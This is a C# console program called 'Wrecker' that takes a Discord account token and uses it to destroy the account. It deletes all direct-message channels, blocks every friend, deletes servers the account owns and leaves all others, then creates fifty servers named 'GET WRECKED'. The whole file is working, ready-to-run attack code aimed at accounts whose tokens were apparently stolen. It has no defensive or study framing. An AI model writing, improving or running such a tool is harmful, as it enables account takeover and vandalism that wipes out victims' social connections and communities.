using Discord.Gateway;
using Discord;
using System;
using System.Drawing;
using System.Threading;
using Console = Colorful.Console;

namespace Wrecker
{
    class Program
    {
        static void Main()
        {
        start:
            string token;

            #region art
            Console.WriteLine("▄█     █▄     ▄████████    ▄████████  ▄████████    ▄█   ▄█▄    ▄████████    ▄████████", Color.FromArgb(255, 0, 56));
            Thread.Sleep(300);
            Console.WriteLine("███     ███   ███    ███   ███    ███ ███    ███   ███ ▄███▀   ███    ███   ███    ███ ", Color.FromArgb(255, 0, 56));
            Thread.Sleep(300);
            Console.WriteLine("███     ███   ███    ███   ███    █▀  ███    █▀    ███▐██▀     ███    █▀    ███    ███ ", Color.FromArgb(255, 0, 56));
            Thread.Sleep(300);
            Console.WriteLine("███     ███   ███    ███   ███    █▀  ███    █▀    ███▐██▀     ███    █▀    ███    ███ ", Color.FromArgb(255, 0, 56));
            Thread.Sleep(300);
            Console.WriteLine("███     ███  ▄███▄▄▄▄██▀  ▄███▄▄▄     ███         ▄█████▀     ▄███▄▄▄      ▄███▄▄▄▄██▀", Color.FromArgb(255, 0, 56));
            Thread.Sleep(300);
            Console.WriteLine("███     ███ ▀▀███▀▀▀▀▀   ▀▀███▀▀▀     ███        ▀▀█████▄    ▀▀███▀▀▀     ▀▀███▀▀▀▀▀   ", Color.FromArgb(255, 0, 56));
            Thread.Sleep(300);
            Console.WriteLine("███     ███ ▀███████████   ███    █▄  ███    █▄    ███▐██▄     ███    █▄  ▀███████████ ", Color.FromArgb(255, 0, 56));
            Thread.Sleep(300);
            Console.WriteLine("███ ▄█▄ ███   ███    ███   ███    ███ ███    ███   ███ ▀███▄   ███    ███   ███    ███ ", Color.FromArgb(255, 0, 56));
            Thread.Sleep(300);
            Console.WriteLine(" ▀███▀███▀    ███    ███   ██████████ ████████▀    ███   ▀█▀   ██████████   ███    ███", Color.FromArgb(255, 0, 56));
            Thread.Sleep(300);
            Console.WriteLine("              ███    ███                           ▀                        ███    ███ ", Color.FromArgb(255, 0, 56));
            Console.WriteLine();
            Console.WriteLine();
            #endregion

            Console.Write("Enter token: ", Color.FromArgb(152, 251, 152));
            token = Console.ReadLine();

            #region wrecking token
            try
            {
                DiscordClient client = new DiscordClient(token);

                #region removing dms
                Console.WriteLine();
                Console.WriteLine("Removing DM's...", Color.FromArgb(152, 251, 152));
                if (client.GetPrivateChannels().Count != 0)
                {
                    int ic = 0;

                    foreach (MinimalChannel c in client.GetPrivateChannels())
                    {
                        ic = ic + 1;
                        client.DeleteChannel(c.Id);
                        Console.Write("Removed DM: ", Color.Red);
                        Console.WriteLine(ic, Color.FromArgb(152, 251, 152));
                    }
                }
                else
                {
                    Console.WriteLine("No DM's found!", Color.Red);
                }
                #endregion

                #region removing friends
                Console.WriteLine();
                Console.WriteLine("Removing friends...", Color.FromArgb(152, 251, 152));
                if (client.GetRelationships().Count != 0)
                {
                    foreach (Relationship relationship in client.GetRelationships())
                    {
                        if (relationship.Type.ToString() != "Blocked")
                        {
                            string fname = client.GetUser(relationship.User).Username.ToString();
                            client.BlockUser(relationship.User);
                            Console.Write("Removed and blocked friend: ", Color.Red);
                            Console.WriteLine(fname, Color.FromArgb(152, 251, 152));
                        }
                        else
                        {
                            Console.WriteLine("No friends found!", Color.Red);
                            break;
                        }
                    }
                }
                else
                {
                    Console.WriteLine("No friends found!", Color.Red);
                }
                #endregion

                #region removing servers
                Console.WriteLine();
                Console.WriteLine("Removing servers...", Color.FromArgb(152, 251, 152));
                if (client.GetGuilds().Count != 0)
                {
                    foreach (MinimalGuild g in client.GetGuilds())
                    {
                        var guild = client.GetGuild(g.Id);
                        string gname = guild.Name.ToString();

                        if(guild.OwnerId == client.User.Id)
                        {
                            client.DeleteGuild(g);
                            Console.Write("Deleted server: ", Color.Red);
                            Console.WriteLine(gname, Color.FromArgb(152, 251, 152));
                        } else
                        {
                            client.LeaveGuild(g);
                            Console.Write("Left server: ", Color.Red);
                            Console.WriteLine(gname, Color.FromArgb(152, 251, 152));
                        }
                    }
                }
                else
                {
                    Console.WriteLine("No servers found!", Color.Red);
                }
                #endregion

                #region creating trash servers
                Console.WriteLine();
                Console.WriteLine("Creating trash servers...", Color.FromArgb(152, 251, 152));

                int i = 0;
                while (i != 50)
                {
                    client.CreateGuild("GET WRECKED");
                    i = i + 1;
                    Console.Write("Created trash server: ", Color.Red);
                    Console.WriteLine(i, Color.FromArgb(152, 251, 152));
                }
                #endregion

            }
            #endregion

            #region checking if token is invalid
            catch (Exception)
            {
                Console.WriteLine();
                Console.WriteLine("Token is invalid!", Color.Red);
                Thread.Sleep(5000);
                Console.Clear();
                goto start;
            }
            #endregion

            #region finish
            Console.WriteLine();
            Console.WriteLine("Token has been wrecked!", Color.FromArgb(152, 251, 152));
            Thread.Sleep(5000);
            Console.Clear();
            goto start;
            #endregion
        }
    }
}